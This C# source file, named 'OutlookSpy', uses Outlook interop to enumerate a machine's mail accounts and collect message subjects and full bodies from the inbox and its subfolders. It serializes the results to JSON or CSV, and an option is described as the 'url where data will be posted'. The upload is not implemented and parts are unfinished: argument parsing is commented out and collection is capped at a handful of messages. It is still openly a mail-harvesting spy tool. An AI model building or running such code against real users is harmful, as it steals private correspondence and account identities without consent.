using ArgumentParser;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Outlook = Microsoft.Office.Interop.Outlook;

namespace OutlookSpy
{
	class Program
	{
		static public Outlook.Application outlookApplication = new Outlook.Application();
		static public Outlook.NameSpace outlookNamespace = outlookApplication.GetNamespace("MAPI");
		static public Outlook.MAPIFolder inboxFolder = outlookNamespace.GetDefaultFolder(Outlook.OlDefaultFolders.olFolderInbox);
		static public Outlook.Accounts outlookAccounts = outlookApplication.Session.Accounts;
    static public DataSet outlookDs = new DataSet("Outlook");
    static public long maxMessages = 1000;

    static void Main(string[] args)
		{
      ArgParse argparse = new ArgParse
      (
          new ArgItem("action", "a", true, "Action to be taken", "", ArgParse.ArgParseType.Choice, new string[] { "accounts", "full", "messages_meta", "message_single", "message_full" }),
          new ArgItem("max-records", "m", false, "Number of messages to retrieve", "1000", ArgParse.ArgParseType.String),
          new ArgItem("filter", "f", false, "Filter for searching email body", "", ArgParse.ArgParseType.String),
          new ArgItem("subject-begins", "sb", false, "Filters messages if the subject begins with the specified value.", "", ArgParse.ArgParseType.String),
          new ArgItem("subject-contains", "sc", false, "Filters messages if the subject contains the specified value.", "", ArgParse.ArgParseType.String),
          new ArgItem("subject-equals", "se", false, "Filters messages if the subject equals the specified value.", "", ArgParse.ArgParseType.String),
					new ArgItem("max-message-size", "fs", false, ".", "Restricts gathered messages to the specified size in bytes", ArgParse.ArgParseType.String),
					new ArgItem("output", "o", false, "Output type: csv,json", "json", ArgParse.ArgParseType.Choice, new string[] { "csv", "json" }),
          new ArgItem("url", "u", false, "url where data will be posted", "", ArgParse.ArgParseType.Url)
      );

			//argparse.parse(args);

			string action = argparse.Get<string>("action");
			int maxRecords = argparse.Get<int>("max-records");
			string filter = argparse.Get<string>("filter");
			string subjectBegins = argparse.Get<string>("subject-begins");
			string subjectContains = argparse.Get<string>("subject-contains");
			string subjectEquals = argparse.Get<string>("subject-equals");
			long maxMessageSize = argparse.Get<long>("max-message-size");
			string output = argparse.Get<string>("output");
			string url = argparse.Get<string>("url");

			Setup();
      ListMailItems();
      ListAccounts();
    }

		static void Setup()
		{
      DataTable messagesDt = new DataTable("messages");
			messagesDt.Columns.Add("EntryId", Type.GetType("System.String"));
			messagesDt.Columns.Add("DateReceived", Type.GetType("System.DateTime"));
			messagesDt.Columns.Add("Subject", Type.GetType("System.String"));
			messagesDt.Columns.Add("BodyText", Type.GetType("System.String"));
			messagesDt.Columns.Add("Size", Type.GetType("System.Int64"));
			outlookDs.Tables.Add(messagesDt);

      DataTable accountDt = new DataTable("accounts");
      accountDt.Columns.Add("SmtpAddress", Type.GetType("System.String"));
      accountDt.Columns.Add("UserName", Type.GetType("System.String"));
      accountDt.Columns.Add("DisplayName", Type.GetType("System.String"));
      outlookDs.Tables.Add(accountDt);
    }

		static void ListAccounts()
		{
      DataTable accountDt = outlookDs.Tables["accounts"];

      foreach (Outlook.Account account in outlookAccounts)
			{
        accountDt.Rows.Add(new object[] { account.SmtpAddress, account.UserName, account.DisplayName });
				Console.WriteLine(string.Format("{0}\t{1}\t{2}", account.SmtpAddress, account.UserName, account.DisplayName));
			}
    }

    static void ProcessFolder(Outlook.MAPIFolder folder)
    {
      DataTable messagesDt = outlookDs.Tables["messages"];
      foreach (Outlook.MailItem message in folder.Items)
      {
        if(messagesDt.Rows.Count > 5)
        {
          break;
        }
        messagesDt.Rows.Add(new object[] { message.EntryID, message.ReceivedTime, message.Subject, message.Body, message.Size });
      }

      if(folder.Folders.Count > 0)
      {
        foreach (Outlook.MAPIFolder f in folder.Folders)
        {
          ProcessFolder(f);
        }
      }
    }

		static void ListMailItems()
    {
      foreach (Outlook.Folder f in inboxFolder.Folders)
      {
        Console.WriteLine(f.FolderPath);
      }

      ProcessFolder(inboxFolder);
		}

		private static string ToJSON(DataTable table)
		{
			//https://www.c-sharpcorner.com/UploadFile/9bff34/3-ways-to-convert-datatable-to-json-string-in-Asp-Net-C-Sharp/
			var JSONString = new StringBuilder();
			if (table.Rows.Count > 0)
			{
				JSONString.Append("[");
				for (int i = 0; i < table.Rows.Count; i++)
				{
					JSONString.Append("{");
					for (int j = 0; j < table.Columns.Count; j++)
					{
						if (j < table.Columns.Count - 1)
						{
							JSONString.Append("\"" + table.Columns[j].ColumnName.ToString().Replace("\"", "\\\"") + "\":" + "\"" + table.Rows[i][j].ToString().Replace("\"", "\\\"") + "\",");
						}
						else if (j == table.Columns.Count - 1)
						{
							JSONString.Append("\"" + table.Columns[j].ColumnName.ToString().Replace("\"", "\\\"") + "\":" + "\"" + table.Rows[i][j].ToString().Replace("\"", "\\\"") + "\"");
						}
					}
					if (i == table.Rows.Count - 1)
					{
						JSONString.Append("}");
					}
					else
					{
						JSONString.Append("},");
					}
				}
				JSONString.Append("]");
			}
			return JSONString.ToString();
		}

		public static string ToCSV(DataTable dt)
		{
			string result = "";
			for (int i = 0; i < dt.Columns.Count; i++)
			{
				result += dt.Columns[i];
				if (i < dt.Columns.Count - 1)
				{
					result += ",";
				}
			}

			result += "\n";

			foreach (DataRow dr in dt.Rows)
			{
				for (int i = 0; i < dt.Columns.Count; i++)
				{
					if (!Convert.IsDBNull(dr[i]))
					{
						string value = dr[i].ToString();
						if (value.Contains(","))
						{
							value = String.Format("\"{0}\"", value.Replace("\"", "\\\""));
							result += value;
						}
						else
						{
							result += dr[i].ToString();
						}
					}
					if (i < dt.Columns.Count - 1)
					{
						result += ",";
					}
				}
				result += "\n";
			}

			return result;
		}
	}
}
